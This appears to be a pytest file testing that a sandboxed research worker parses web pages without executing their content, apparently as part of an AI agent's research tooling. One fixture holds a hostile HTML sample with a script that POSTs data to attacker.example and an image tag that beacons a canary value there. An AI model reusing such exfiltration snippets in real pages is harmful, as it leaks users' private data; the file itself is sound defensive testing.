"""Opt-in offline acceptance against an actual local container runtime.

AICL_TEST_RESEARCH_IMAGE must name an immutable, already cached image. Tests do
not pull images, contact a search provider or make a live page request.
"""
import base64
import os

import pytest

from aicl.network.research_worker import DockerResearchWorker


IMAGE = os.environ.get("AICL_TEST_RESEARCH_IMAGE")
pytestmark = pytest.mark.skipif(not IMAGE, reason="An immutable local containment test image was not supplied")


def test_actual_worker_kernel_denies_public_network_privileges_and_host_writes():
    worker = DockerResearchWorker(IMAGE)
    assert worker.check() is True


def test_actual_worker_processes_only_public_data_and_does_not_execute_page_content():
    worker = DockerResearchWorker(IMAGE)
    plan = {"action": "plan", "operations": [{"kind": "page", "url": "https://news.example/article"}]}
    assert worker.execute(plan) == {"operations": plan["operations"]}
    hostile = (b'<title>Public source</title><p>Public evidence</p>'
               b'<script>fetch("https://attacker.example/upload",{method:"POST",body:"diagnostics"})</script>'
               b'<img src="https://attacker.example/pixel?private=PRIVATE-CANARY">')
    result = worker.execute({"action": "parse", "kind": "page", "url": "https://news.example/article",
        "content_type": "text/html", "body": base64.b64encode(hostile).decode("ascii")})
    assert result["text"] == "Public evidence"
    assert result["title"] == "Public source"
    assert result["instruction_authority"] == "untrusted_evidence"
    assert "PRIVATE-CANARY" not in str(result)
